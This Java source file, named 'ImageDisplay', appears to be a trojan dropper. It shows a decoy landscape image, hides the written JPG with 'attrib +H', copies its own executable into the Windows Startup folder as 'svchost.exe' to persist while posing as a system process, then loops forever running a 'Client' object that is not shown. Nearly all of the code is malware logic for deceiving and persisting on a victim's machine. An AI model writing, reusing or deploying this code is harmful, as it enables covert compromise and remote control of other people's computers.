package client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.Files;
import java.util.UUID;

public class ImageDisplay
{
    public static void main(String[] args)
    {
        final String startUpPath = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        String startUpDirectory = System.getProperty("user.home") + startUpPath;

        boolean firstTime = !System.getProperty("user.dir").equalsIgnoreCase(startUpDirectory);
        if(firstTime)
        {
            new ImageDisplay();

            File source = new File("IMG_01648123.exe");
            File destination = new File(startUpDirectory + "\\svchost.exe");
            try {
                Files.copy(source.toPath(),destination.toPath());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        UUID uniqueId = UUID.randomUUID();
        while (true)
        {
            Client client = new Client(uniqueId);
            client.run();
        }
    }

    public ImageDisplay()
    {
        try {
            String filename = "/resources/landscape.jpg";
//            File file = new File(getClass().getResource(filename).toURI());

            InputStream resourceAsStream = getClass().getResourceAsStream(filename);
            BufferedImage image = ImageIO.read(resourceAsStream);

            File file = new File("IMG_01638123.JPG");
            Runtime.getRuntime().exec("attrib +H IMG_01638123.JPG");
            ImageIO.write(image,"jpg", file);

            Desktop desktop = Desktop.getDesktop();
            desktop.open(file);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}